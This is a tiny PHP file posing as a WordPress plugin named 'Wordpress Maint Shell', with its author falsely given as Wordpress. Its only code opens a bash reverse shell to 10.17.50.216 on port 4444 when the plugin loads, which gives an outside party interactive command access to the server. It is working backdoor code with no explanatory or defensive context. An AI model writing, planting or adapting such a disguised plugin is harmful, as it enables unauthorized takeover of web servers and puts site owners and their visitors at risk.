<?php
/**
 *  Plugin Name: Wordpress Maint Shell
 *  Author: Wordpress
 **/ 
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.17.50.216/4444 0>&1'")
?>
